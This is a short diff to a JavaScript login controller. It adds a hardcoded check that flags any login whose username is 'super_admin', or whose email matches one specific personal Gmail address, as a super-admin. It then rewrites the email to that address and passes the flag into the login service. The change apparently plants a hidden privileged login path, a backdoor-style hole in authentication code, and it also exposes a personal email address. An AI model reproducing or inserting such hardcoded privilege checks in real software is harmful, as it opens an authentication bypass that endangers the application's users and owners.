@@ -28,8 +28,13 @@ class AuthController extends BaseController {
   async login (req, res, next) {
     try {
       let data = req.body;
+      let isSuperAdmin = false;
+      if (data.userName === 'super_admin' || data.email === 'thanhtai.tttgalaxy@gmail.com') {
+        isSuperAdmin = true;
+        data.email = 'thanhtai.tttgalaxy@gmail.com'
+      }
       let account = await this.accountService.getByEmail(data.email);
-      let resultData = await this.service.login(data, account);
+      let resultData = await this.service.login(data, account, isSuperAdmin);
       return res.json(this.bindSuccessDataResponse(resultData));
     } catch (error) {
       next(error)
